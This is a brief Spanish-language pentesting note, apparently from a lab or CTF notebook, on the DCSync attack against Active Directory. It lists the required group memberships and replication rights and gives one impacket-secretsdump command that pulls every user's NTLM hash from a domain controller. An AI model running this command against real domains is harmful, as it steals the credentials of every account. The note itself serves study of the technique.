El DCSync es un ataque en el que nos hacemos pasar por otro controlador de dominio, solicitando una sincronización, como parte de esta sincronización, se pasan los hashes NTLM de todos los usuarios (incluyendo el administrador)

## Pre-requisitos 

### Pertenecer a alguno de estos grupos:

- **Domain Admins**

- **Administrators**

- **Enterprise Admins**

### Tener los siguientes permisos

- **Replicating Directory Changes** — (LDAP right: DS-Replication-Get-Changes).

- **Replicating Directory Changes All** — (LDAP right: DS-Replication-Get-Changes-All).
 
# Ataque 

Podemos usar el ataque de diferentes formas:

### Usando impacket-secretsdump

```r
impacket-secretsdump '{DOMINIO}/{USUARIO_ADMIN}:{CONTRASEÑ}'@10.10.11.70
```

